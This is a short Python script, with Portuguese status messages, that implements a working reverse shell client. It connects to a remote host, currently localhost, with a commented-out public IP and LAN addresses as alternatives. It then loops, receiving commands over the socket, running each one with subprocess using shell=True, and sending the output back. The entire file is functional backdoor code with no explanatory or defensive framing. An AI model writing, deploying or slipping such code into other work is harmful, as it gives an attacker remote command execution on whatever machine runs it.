import socket
import subprocess

REMOTE_HOST = '127.0.0.1' # '179.215.122.66' 192.168.1.65 ip paty
REMOTE_PORT = 8282 # 2222

client  = socket.socket()
print("[-] Preparando conexão...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Conectado!")

while True:
    print("[-] Aguardando comandos...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output=op.stdout.read()
    output_error=op.stderr.read()
    print("[-] Enviando resposta...")
    client.send(output + output_error)
